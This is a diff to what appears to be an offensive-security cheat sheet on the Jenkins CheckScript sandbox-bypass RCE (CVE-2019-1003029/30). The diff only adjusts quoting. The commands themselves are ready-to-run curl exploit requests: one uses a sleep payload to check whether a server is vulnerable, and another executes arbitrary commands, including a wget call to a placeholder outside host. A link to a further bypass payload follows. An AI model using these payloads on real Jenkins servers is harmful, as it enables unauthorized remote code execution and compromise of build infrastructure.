@@ -32,12 +32,12 @@ CheckScript RCE in Jenkins (CVE-2019-10030{29,30})
 
 Check if a Jenkins instance is vulnerable (needs Overall/Read permissions) with some Groovy:
 ```bash
-curl -k -4 -X POST "https://whatever.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d "value=class abcd{abcd(){sleep(5000)}}"
+curl -k -4 -X POST "https://whatever.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
 ```
 
 Execute arbitraty bash commands:
-```
-curl -k -4 -X POST "https://whatever.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d "value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt"}}"
+```bash
+curl -k -4 -X POST "https://whatever.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt"}}'
 ```
 
 Alternative RCE/DACL bypass payload [here](https://gist.github.com/akhil-reni/e2116cc243af096ca3416168f49b3298) though be advised that this one will absolutely trash the whole security configuration!
